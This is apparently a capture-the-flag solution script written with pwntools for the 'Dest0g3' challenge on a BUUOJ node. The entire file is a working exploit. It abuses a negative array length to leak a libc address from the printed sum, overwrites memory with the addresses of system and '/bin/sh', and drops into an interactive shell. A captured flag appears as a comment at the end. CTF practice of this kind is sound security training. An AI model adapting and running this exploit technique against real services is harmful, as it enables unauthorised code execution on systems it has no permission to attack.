#!/usr/bin/python3
#-*- coding: utf-8 -*-
from pwn import *

# context.log_level = 'debug'
context.arch='amd64'
context.terminal = ['tmux','sp','-h','-l','120']

remote_service = "node4.buuoj.cn:29128"
remote_service = remote_service.strip().split(":")
p = remote(remote_service[0], int(remote_service[1]))
filename = "./pwn"
# p = process(filename)
e = ELF(filename, checksec=False)
# l = ELF(e.libc.path, checksec=False)
l = ELF("./libc.so.6")

rl = lambda a=False : p.recvline(a)
ru = lambda a,b=True : p.recvuntil(a,b)
rn = lambda x : p.recvn(x)
sn = lambda x : p.send(x)
sl = lambda x : p.sendline(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)
irt = lambda : p.interactive()
dbg = lambda text=None : gdb.attach(p, text)
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
uu32 = lambda data : u32(data.ljust(4, b'\x00'))
uu64 = lambda data : u64(data.ljust(8, b'\x00'))
def debugPID():
    # lg("p.pid")
    # input()
    pass

off0 = 0x1d5ce0
off1 = 0x17b9db
off2 = 0x3cf10
# off0 = l.symbols['_IO_2_1_stderr_']
# off1 = next(l.search(b"/bin/sh\x00"))
# off2 = l.symbols['system']

def cmd(choice):
	ru(b'input your choice:\n')
	sl(str(choice).encode())
def insert(addr):
	cmd(1)
	ru(b'input num\n')
	sl(str(addr).encode())

debugPID()
ru(b'input the length of array:\n')
sl(b"-1")

for i in range(10):
	insert(0)

insert(-1)

insert(1)

insert(15)
insert(0)
insert(0)
cmd(2)
ru(b'sum = -')
res = ((0x1 << 0x8*4) - int(ru(b"\n", "drop"))) - 64
leak_addr = res - off0
lg("res")

# or al, 0x5b ; pop esi ; pop edi ; pop ebp ; ret
# rop1 = 0x080494df
# pop_ebx = 0x08049022

# insert(0) # ebp
target = leak_addr + off2
lg("target")
# input()
insert(-1 * ((0x1 << 0x8*4) - target))

insert(0)
target = leak_addr + off1
insert(-1 * ((0x1 << 0x8*4) - target))

debugPID()
cmd(4)
irt()
# Dest0g3{d25e6888-e09e-4dd0-b027-480be99be64b}
# libc6-i386_2.27-3ubuntu1.6_amd64